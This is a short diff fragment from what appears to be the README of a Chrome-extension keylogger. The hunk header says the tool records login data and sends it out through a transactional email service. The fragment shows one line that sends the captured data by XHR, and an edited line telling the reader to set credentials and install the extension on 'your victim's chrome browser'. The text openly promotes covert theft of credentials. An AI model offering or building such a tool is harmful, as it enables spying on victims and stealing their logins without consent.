@@ -21,4 +21,4 @@ Simplest keylogger, directly records login data to transactional email (mailgun 
  xhr.send(JSON.stringify(body));
 ```
 
-Set your mandrill credentials, then install extension on your victim's chrome browser and that's it!
+Set your credentials, then install extension on your victim's chrome browser and that's it!
